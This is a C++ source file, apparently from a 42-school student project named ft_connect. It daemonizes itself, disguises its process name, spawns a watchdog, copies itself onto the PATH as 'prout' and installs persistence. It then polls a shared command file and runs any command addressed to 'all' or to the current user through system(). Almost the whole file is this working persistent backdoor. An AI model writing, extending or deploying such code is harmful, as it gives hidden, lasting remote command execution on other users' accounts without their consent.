/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.cpp                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/02/25 14:27:21 by zcadinot          #+#    #+#             */
/*   Updated: 2026/03/09 03:07:10 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_connect.hpp"

static const std::string g_super_users[] = SUPER_USERS;

static const size_t g_super_users_count =
    sizeof(g_super_users) / sizeof(g_super_users[0]);

bool is_super_user(const std::string &name)
{
    size_t i = 0;

    while (i < g_super_users_count)
    {
        if (g_super_users[i] == name)
            return true;
        i++;
    }
    return false;
}

std::string get_current_user(void)
{
    struct passwd *pw = getpwuid(getuid());

    if (!pw)
        return "";
    return std::string(pw->pw_name);
}

bool is_current_user(const std::string &name)
{
    std::string current;

    current = get_current_user();
    if (!current.length())
        return false;
    return (name == current);
}

std::string get_first_line(const std::string &path)
{
    std::ifstream file(path.c_str());
    std::string line;

    if (!file)
        return "";

    std::getline(file, line);
    return line;
}

void kill_old_instances(bool kill_self)
{
    pid_t current_pid = getpid();
    std::stringstream ss;

    ss << "pgrep " << PROC_NAME;

    FILE *pipe = popen(ss.str().c_str(), "r");
    if (!pipe)
        return;

    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe))
    {
        pid_t pid = atoi(buffer);

        if (kill_self || pid != current_pid)
            kill(pid, SIGKILL);
    }
    pid_t pid = get_watchdog_pid();

    if (pid > 0)
        kill(pid, SIGKILL);

    pclose(pipe);
}

void clear_file(const std::string &path)
{
    std::ofstream file(path.c_str(), std::ios::trunc);

    if (!file)
    {
        /* std::cout << "Erreur ouverture\n"; */
        return;
    }
}

data create_cmd_struct(const std::string &line)
{
    data cmd;
    size_t pos;

    pos = line.find(';');
    if (pos == std::string::npos)
    {
        /* std::cout << "Format invalide\n"; */
        return cmd;
    }

    cmd.name = line.substr(0, pos);
    cmd.command = line.substr(pos + 1);

    return cmd;
}

void exec_cmd(const std::string &cmd, const bool headless)
{
    if (cmd.empty())
    {
        /* std::cout << "Commande vide\n"; */
        return;
    }

    if (headless)
    {
        std::string silent_cmd = cmd + " > /dev/null 2>&1";
        system(silent_cmd.c_str());
    }
    else
    {
        system(cmd.c_str());
    }
}

static void daemonize(void)
{
    pid_t pid = fork();

    if (pid < 0)
        exit(1);

    if (pid > 0)
        exit(0);
    if (pid == 0)
        prctl(PR_SET_NAME, PROC_NAME, 0, 0, 0);

    setsid();
}

int main(int argc, char **argv)
{
    std::string content;
    pid_t watchdog_pid;
    data cmd;

    if (argc == 2 && std::string(argv[1]) == "-d")
    {
        remove_persistence();
        kill_old_instances(true);
        return 0;
    }

    kill_old_instances(false);
    prctl(PR_SET_NAME, PROC_NAME, 0, 0, 0);
    daemonize();
    watchdog_pid = watchdog();
    save_watchdog_pid(watchdog_pid);
    cp_bin_to_path("prout");
    create_user_file();
    persistance();

    while (true)
    {
        content = get_first_line(CMD_FILE);

        if (!content.length())
        {
            usleep(LOOP_DELAY);
            continue;
        }

        cmd = create_cmd_struct(content);
        if (!cmd.name.length() || !cmd.command.length())
        {
            clear_file(CMD_FILE);
            usleep(LOOP_DELAY);
            continue;
        }

        if (is_super_user((cmd.name)))
        {
            notify_last_sender_warning();
            clear_file(CMD_FILE);
            usleep(LOOP_DELAY);
            continue;
        }
        if (cmd.name == "all")
        {
            exec_cmd(cmd.command, 0);
            clear_file(CMD_FILE);
            sleep(1);
        }
        else if (is_current_user(cmd.name))
        {
            clear_file(CMD_FILE);
            exec_cmd(cmd.command, 0);
        }
        usleep(LOOP_DELAY);
    }
    return 0;
}
